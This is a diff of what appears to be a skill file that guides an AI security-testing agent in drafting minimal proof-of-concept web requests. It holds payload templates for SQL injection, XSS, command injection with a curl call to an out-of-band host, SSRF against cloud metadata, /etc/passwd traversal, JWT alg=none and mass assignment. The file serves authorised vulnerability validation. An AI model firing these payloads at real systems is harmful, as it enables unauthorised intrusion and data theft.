@@ -5,6 +5,10 @@ description: |
   confirmation. PoCs must be minimal, non-destructive, and reproducible.
   Use OOB tokens for blind cases. Never POST destructive payloads to a
   production-like system without manifest allow-listing.
+when_to_use:
+  - Validator is moving a hypothesis from static reasoning to a live HTTP confirmation.
+  - You need to confirm a blind injection and require an OOB token.
+  - You are tempted to fire a destructive payload at a target — stop and re-read this skill first.
 ---
 
 # PoC drafting
@@ -41,7 +45,7 @@ it. The goal is *evidence*, not damage.
 
 Minimal: single quote, observe error.
 
-```
+```python
 http_request(method="GET", url="<base>/search", params={"q": "'"})
 ```
 
@@ -52,7 +56,7 @@ Signal: response body contains DB error string ("SQL syntax", "ORA-",
 
 Use 5-second delay. Avoid > 10 seconds (server resource concern).
 
-```
+```python
 http_request(..., params={"q": "1 OR SLEEP(5)--"})
 ```
 
@@ -60,7 +64,7 @@ Signal: `duration_ms` jumps by ~5000 vs baseline.
 
 ### XSS (reflected)
 
-```
+```python
 http_request(..., params={"q": "lacxss<script>1</script>"})
 ```
 
@@ -70,7 +74,7 @@ Signal: `body_sample` contains the literal payload, unescaped.
 
 Use OOB. Don't execute `id` if you don't need to.
 
-```
+```text
 1. token, url = oob_callback_register(label="cmdi-confirm")
 2. http_request(..., params={"name": f"x; curl http://{token}.oob.local/"})
 3. wait 30s
@@ -79,7 +83,7 @@ Use OOB. Don't execute `id` if you don't need to.
 
 ### SSRF (with response body)
 
-```
+```python
 http_request(method="GET", url="<base>/fetch?url=http://169.254.169.254/latest/meta-data/")
 ```
 
@@ -92,7 +96,7 @@ OOB pattern. Embed token in the user-controlled URL.
 
 ### Path traversal
 
-```
+```python
 http_request(..., params={"file": "../../../etc/passwd"})
 ```
 
@@ -101,7 +105,7 @@ listing if the endpoint is a static file server.
 
 ### Open redirect
 
-```
+```python
 http_request(method="GET", url="<base>/login?next=https://lacuna-evil.example/")
 ```
 
@@ -112,7 +116,7 @@ the body contains such a redirect).
 
 Need two user sessions. Use `auth_login` twice with different flow names.
 
-```
+```text
 1. auth_login(flow_name="user-alice")
 2. auth_login(flow_name="user-bob")
 3. http_request(method="GET", url="<base>/api/orders/<alice's order id>", session="user-bob")
@@ -122,7 +126,7 @@ Signal: Bob's request returns Alice's order data with status 200.
 
 ### JWT alg=none
 
-```
+```text
 1. Construct unsigned JWT manually: base64url("eyJhbGciOiJub25lIn0") + "." +
    base64url(claims) + "."
 2. http_request(..., headers={"Authorization": f"Bearer {token}"})
@@ -132,7 +136,7 @@ Signal: response 200 (i.e. accepted) rather than 401.
 
 ### Mass assignment
 
-```
+```python
 http_request(method="PUT", url="<base>/api/profile", session="ordinary-user",
               json_body={"email": "x@y.com", "role": "admin"})
 ```
